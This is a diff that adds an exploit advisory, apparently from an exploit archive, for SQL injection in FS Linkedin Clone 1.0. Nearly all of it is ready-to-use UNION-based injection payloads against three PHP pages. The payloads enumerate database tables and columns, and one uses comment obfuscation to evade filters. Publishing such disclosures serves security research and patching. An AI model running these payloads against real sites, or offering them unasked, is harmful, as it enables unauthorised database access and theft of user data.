@@ -1,0 +1,43 @@
+# # # # # 
+# Exploit Title: FS Linkedin Clone 1.0 - SQL Injection
+# Dork: N/A
+# Date: 08.12.2017
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/linkedin-clone/
+# Demo: http://linkedin-clone.demonstration.co.in/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/group.php?grid=[SQL]
+# 
+# -1'++UNION+ALL+SELECT+1,2,3,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR+1,4,0x30),0x3a20,table_name,0x3c62723e))))x),5,6,7,8,9,10,11,12,13,14--+-
+# 
+# http://server/group.php?grid=-1'++UNION+ALL+SELECT+1,2,3,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR+1,4,0x30),0x3a20,table_name,0x3c62723e))))x),5,6,7,8,9,10,11,12,13,14--+-
+# 
+# 2)
+# http://localhost/[PATH]/profile.php?fid=[SQL]
+# 
+# -44'++UNION(SELECT(1),(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)),(3),(4),(5),(6),(7),(8),(9),(10),(11))--+-
+# 
+# http://server/profile.php?fid=-44'++UNION(SELECT(1),(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)),(3),(4),(5),(6),(7),(8),(9),(10),(11))--+-
+# 
+# 3)
+# http://localhost/[PATH]/company_details.php?id=[SQL]
+# 
+# -9491e369853df766fa44e1ed0ff613f563bd'++UNION+ALL+SELECT+1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()),4,5,6,7--+-
+# 
+# http://server/company_details.php?id=-9491e369853df766fa44e1ed0ff613f563bd'++UNION+ALL+SELECT+1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()),4,5,6,7--+-
+# 
+# # # # #
